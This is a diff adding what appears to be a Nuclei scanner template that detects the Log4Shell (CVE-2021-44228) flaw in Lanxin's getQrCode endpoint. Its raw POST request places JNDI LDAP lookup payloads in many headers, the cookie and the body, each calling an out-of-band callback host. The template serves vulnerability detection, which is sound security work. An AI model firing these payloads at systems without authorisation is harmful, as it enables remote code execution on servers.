@@ -1,0 +1,38 @@
+id: cve-2021-44228-lanxin
+info:
+  name: Lanxin log4j2 getQrCode Remote Command Execution (CVE-2021-44228)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Lanxin is vulnerable to a remote command execution vulnerability due to log4j2.
+    Attackers can exploit this to execute arbitrary commands on the server, potentially
+    taking full control of the system.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cve-id: CVE-2021-44228
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+  tags: command-execution,log4j2
+http:
+  - raw:
+      - |
+        POST /pc/getQrCode.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: 2${jndi:ldap://{{interactsh-url}}}
+        Cookie: route=2${jndi:ldap://{{interactsh-url}}}
+        SESSION: 2${jndi:ldap://{{interactsh-url}}}
+        X-Requested-With: 2${jndi:ldap://{{interactsh-url}}}
+        User-Agent: 2${jndi:ldap://{{interactsh-url}}}
+        X-Client-IP: 2${jndi:ldap://{{interactsh-url}}}
+        X-Forwarded-For: 2${jndi:ldap://{{interactsh-url}}}
+        X-Api-Version: 2${jndi:ldap://{{interactsh-url}}}
+
+        operationType=2${jndi:ldap://{{interactsh-url}}}
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
